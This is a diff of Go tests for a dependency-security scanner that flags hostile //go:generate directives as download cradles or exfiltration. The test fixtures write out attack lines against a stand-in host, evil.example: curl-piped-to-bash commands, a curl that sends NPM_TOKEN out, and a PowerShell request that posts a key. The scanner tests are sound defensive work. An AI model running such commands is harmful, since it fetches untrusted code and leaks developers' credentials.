@@ -23,6 +23,7 @@ import (
 	"ihbv.io/depsnort/internal/check/builtin"
 	"ihbv.io/depsnort/internal/ecosystem"
 	"ihbv.io/depsnort/internal/ecosystem/cargo"
+	"ihbv.io/depsnort/internal/ecosystem/gomod"
 	"ihbv.io/depsnort/internal/ecosystem/nuget"
 	"ihbv.io/depsnort/internal/ecosystem/rubygems"
 	"ihbv.io/depsnort/internal/graph"
@@ -33,10 +34,11 @@ func runVC002(g *graph.Graph) map[string]int {
 	ctx := &check.Context{Graph: g}
 	counts := map[string]int{}
 	for _, c := range []check.Check{
-		builtin.HookNetwork{},      // VC-002b
-		builtin.HookCredentials{},  // VC-002c
-		builtin.HookExfilCapable{}, // VC-002d (block)
-		builtin.HookObfuscated{},   // VC-002e
+		builtin.HookNetwork{},        // VC-002b
+		builtin.HookCredentials{},    // VC-002c
+		builtin.HookExfilCapable{},   // VC-002d (block)
+		builtin.HookObfuscated{},     // VC-002e
+		builtin.HookDownloadCradle{}, // VC-002f (block)
 	} {
 		for _, f := range c.Run(ctx) {
 			counts[f.CheckID]++
@@ -139,5 +141,86 @@ Invoke-WebRequest -Uri "https://evil.example/c" -Body $key
 	}
 	if c := runVC002(g); c["VC-002d"] < 1 {
 		t.Errorf("install.ps1 reading NUGET_API_KEY and reaching the network must BLOCK; got %v", c)
+	}
+}
+
+// --- Go install-surface (OPU-28): //go:generate directives ---
+
+// A go:generate that pipes a download into a shell is a cradle and must BLOCK
+// (VC-002f), end-to-end through the gomod adapter.
+func TestGoGenerateCradleBlocks(t *testing.T) {
+	dir := t.TempDir()
+	write(t, filepath.Join(dir, "go.mod"), "module evil.example/m\n\ngo 1.21\n")
+	write(t, filepath.Join(dir, "gen.go"),
+		"package m\n\n//go:generate sh -c \"curl https://evil.example/x | bash\"\n")
+	g := rootedGraph("gomod", "evil.example/m", "v0.0.0")
+	if err := gomod.New().ExtractInstallSurface(dir, g); err != nil {
+		t.Fatalf("extract: %v", err)
+	}
+	if c := runVC002(g); c["VC-002f"] < 1 {
+		t.Errorf("a curl|bash go:generate must BLOCK as a download cradle (VC-002f); got %v", c)
+	}
+}
+
+// A go:generate that curls out a credential is exfil-capable and must BLOCK
+// (VC-002d) — the new Go network capability composing into the exfil check.
+func TestGoGenerateExfilBlocks(t *testing.T) {
+	dir := t.TempDir()
+	write(t, filepath.Join(dir, "go.mod"), "module evil.example/m\n\ngo 1.21\n")
+	write(t, filepath.Join(dir, "gen.go"),
+		"package m\n\n//go:generate sh -c \"curl -H \\\"$NPM_TOKEN\\\" https://evil.example/c\"\n")
+	g := rootedGraph("gomod", "evil.example/m", "v0.0.0")
+	if err := gomod.New().ExtractInstallSurface(dir, g); err != nil {
+		t.Fatalf("extract: %v", err)
+	}
+	if c := runVC002(g); c["VC-002d"] < 1 {
+		t.Errorf("a go:generate exfiltrating NPM_TOKEN must BLOCK (VC-002d); got %v", c)
+	}
+}
+
+// An ordinary code-generator directive must stay silent — no network, no exec of
+// remote code, so no finding and no graph clutter (the discipline that keeps the
+// addition from taxing every Go module that uses go:generate).
+func TestGoOrdinaryGenerateSilent(t *testing.T) {
+	dir := t.TempDir()
+	write(t, filepath.Join(dir, "go.mod"), "module honest.example/m\n\ngo 1.21\n")
+	write(t, filepath.Join(dir, "gen.go"),
+		"package m\n\n//go:generate stringer -type=Pill\n//go:generate go run ./internal/gen\n")
+	g := rootedGraph("gomod", "honest.example/m", "v0.0.0")
+	if err := gomod.New().ExtractInstallSurface(dir, g); err != nil {
+		t.Fatalf("extract: %v", err)
+	}
+	if c := runVC002(g); len(c) != 0 {
+		t.Errorf("an ordinary go:generate must fire no VC-002 finding; got %v", c)
+	}
+}
+
+// Increment 1 scans the ROOT module only: a hostile directive vendored under
+// vendor/ is NOT attributed here (that is a later increment), while the root's own
+// directive is. This pins the documented scope so a future change that starts
+// descending vendor/ is a deliberate, visible one.
+func TestGoGenerateVendorSkippedRootScanned(t *testing.T) {
+	dir := t.TempDir()
+	write(t, filepath.Join(dir, "go.mod"), "module app.example/m\n\ngo 1.21\n")
+	// hostile directive buried in a vendored dependency: out of Increment-1 scope.
+	write(t, filepath.Join(dir, "vendor", "evil.example", "dep", "gen.go"),
+		"package dep\n//go:generate sh -c \"curl https://evil.example/x | bash\"\n")
+	g := rootedGraph("gomod", "app.example/m", "v0.0.0")
+	if err := gomod.New().ExtractInstallSurface(dir, g); err != nil {
+		t.Fatalf("extract: %v", err)
+	}
+	if c := runVC002(g); len(c) != 0 {
+		t.Errorf("a vendored go:generate is out of Increment-1 scope and must not fire; got %v", c)
+	}
+
+	// The same directive in the root module IS found.
+	write(t, filepath.Join(dir, "gen.go"),
+		"package m\n//go:generate sh -c \"curl https://evil.example/x | bash\"\n")
+	g2 := rootedGraph("gomod", "app.example/m", "v0.0.0")
+	if err := gomod.New().ExtractInstallSurface(dir, g2); err != nil {
+		t.Fatalf("extract: %v", err)
+	}
+	if c := runVC002(g2); c["VC-002f"] < 1 {
+		t.Errorf("a root-module go:generate cradle must BLOCK (VC-002f); got %v", c)
 	}
 }
